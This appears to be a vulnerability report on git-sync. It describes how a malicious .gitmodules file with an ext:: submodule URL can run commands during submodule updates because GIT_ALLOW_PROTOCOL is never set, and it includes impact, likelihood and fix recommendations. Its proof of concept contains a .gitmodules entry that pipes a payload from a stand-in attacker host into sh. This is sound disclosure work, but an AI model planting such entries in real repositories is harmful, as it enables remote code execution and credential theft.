### Title
Command Injection via Malicious `.gitmodules` `ext::` URL in Submodule Sync - ([File: main.go](main.go))

### Summary
`git-sync` fetches an upstream ref and, when `--submodules` is not set to `off`, runs `git submodule update` against the checked-out worktree, without setting `GIT_ALLOW_PROTOCOL` or otherwise restricting the transport helper that `git submodule` is allowed to invoke. Git's `ext::` remote-helper protocol allows a repository's `.gitmodules` file to specify an arbitrary shell command as a submodule "URL", which git will execute verbatim when initializing/updating that submodule. Since git-sync fetches ref content directly from the configured `--repo` (attacker-controlled if the upstream repo/branch is push-accessible to an untrusted party, e.g. a CI-triggered sync of a PR branch or a shared upstream), a malicious commit can plant a `.gitmodules` entry using `url = ext::sh -c ...` and get that command executed on the git-sync sidecar host as soon as it syncs that ref.

### Finding Description
`main.go` builds the `repoSync` around `git.repo` / `git.ref` (attacker-influenced values come from the fetched commit tree, not from `--repo`/`--ref` themselves) and, per the submodule mode logic (`submodulesRecursive`, `submodulesShallow`, `submodulesOff`), issues `git submodule update` style commands through `repoSync.Run` -> `pkg/cmd.Runner.Run` -> `exec.CommandContext` [1](#0-0) . All git invocations use `exec.CommandContext(ctx, command, args...)` with args passed as a slice (not a shell string), which correctly prevents classic OS shell command injection through argv [2](#0-1) .

However, no code sets `GIT_ALLOW_PROTOCOL` (or passes `-c protocol.ext.allow=never`/`user`) anywhere in `main.go`, and grepping the codebase confirms there is no reference to `GIT_ALLOW_PROTOCOL` at all. Without this restriction, when git-sync performs a submodule fetch/update on a worktree checked out from `git.repo`/`git.ref`, and the checked-out tree contains a `.gitmodules` file with a submodule URL of the form `ext::sh -c "<attacker command>"`, git itself (not git-sync's own exec plumbing) will spawn that shell command as part of resolving the submodule "remote." This is the same bug class as the historical git `ext::`/`.gitmodules` RCE (CVE-2017-1000117 and related submodule takeover issues): the attacker's payload rides inside content that git-sync is designed to fetch and process (a pushed commit / ref), and the shell injection happens one layer down, inside git's own `ext::` helper invocation, which git-sync does not sanitize or block.

### Impact Explanation
If reachable, this results in full arbitrary code execution inside the git-sync sidecar container, with whatever privileges the process holds — including access to any mounted credentials, SSH keys, service account tokens, and the shared volume that the application container reads from. This satisfies the "code execution" and "credential disclosure" impact bars from the validation criteria.

### Likelihood Explanation
This requires: (1) `--submodules` not set to `off` (the default is `submodulesRecursive` per the `submodulesMode` switch statement — off is not the default) [3](#0-2) , and (2) the attacker being able to get a commit/ref containing a malicious `.gitmodules` synced by the git-sync instance — i.e., push access to the configured `--repo`/`--ref`, or the ability to get such a ref merged/fetched (e.g., a CI/PR-preview git-sync pointed at an externally-writable branch). This is a realistic "attacker-pushed commit" scenario per the validation criteria, since git-sync's entire purpose is to sync content it does not otherwise trust to be benign into a local filesystem.

### Recommendation
- Set `GIT_ALLOW_PROTOCOL` (e.g. to `file:ssh:https:git` or a similarly restrictive allowlist that excludes `ext` and `fd`) in the environment used for every `git` invocation made by `repoSync.Run`/`RunWithStdin`, or pass `-c protocol.ext.allow=never -c protocol.file.allow=never` (loosened only as actually required) as global git arguments.
- Apply this restriction unconditionally, not only when `--submodules` is enabled, since nested/transitive submodules or future code paths could also trigger helper resolution.
- Add e2e coverage (in `test_e2e.sh` / `test_git.sh`) asserting that a `.gitmodules` file containing an `ext::` URL fails closed rather than executing.

### Proof of Concept
1. Deploy git-sync pointed at a repo/branch the attacker can push to (default `--submodules=recursive`).
2. Attacker pushes a commit adding `.gitmodules`:
```
[submodule "pwn"]
    path = pwn
    url = ext::sh -c "curl -s http://attacker/payload | sh"
```
3. git-sync's next sync cycle fetches this ref and runs its submodule update path [3](#0-2) , invoking `git` via `pkg/cmd.Runner.Run` (`exec.CommandContext`) [2](#0-1) ; because `GIT_ALLOW_PROTOCOL` is never set anywhere in the codebase, git resolves the `ext::` helper and executes the attacker's shell command inside the sidecar.
